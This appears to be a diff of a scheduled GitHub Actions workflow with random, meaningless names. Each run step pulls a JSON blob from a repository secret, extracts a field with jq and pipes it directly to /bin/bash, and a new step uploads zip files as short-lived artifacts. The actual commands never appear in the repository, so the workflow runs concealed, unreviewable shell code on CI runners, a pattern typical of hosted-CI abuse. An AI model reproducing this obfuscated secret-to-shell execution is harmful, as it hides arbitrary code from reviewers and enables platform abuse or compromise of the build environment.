@@ -1,20 +1,27 @@
 name: jindongminghong
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '55 2/6 * * *'
-jobs:  # 32654
+    - cron: '26 4,10,16,22 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: jindongminghong
         env:
-          skpt6934: ${{ secrets.skpt6934 }}
+          obg699: ${{ secrets.obg699 }}
         run: |
-          echo $skpt6934 | jq -r .bf83363 | /bin/bash
-          echo $btzbo6241 | jq -r .kdrpd24 | /bin/bash
-          echo $o5289 | jq -r .ia6147 | /bin/bash
-          echo $rtvmr567 | jq -r .kfuj80969 | /bin/bash
-          echo $o609 | jq -r .iyd5653 | /bin/bash
+          printf '%s' "$obg699" | jq -r .mz1632 | /bin/bash
+          echo $aqe03 | jq -r .slwq887 | /bin/bash
+          printf '%s' "$dawsv7" | jq -r .ve82623 | /bin/bash
+          printf '%s' "$ohqe409" | jq -r .tly435 | /bin/bash
+          printf '%s' "$xv384" | jq -r .m471 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: AvY4Gv2A
+          path: "*.zip"
+          retention-days: 1
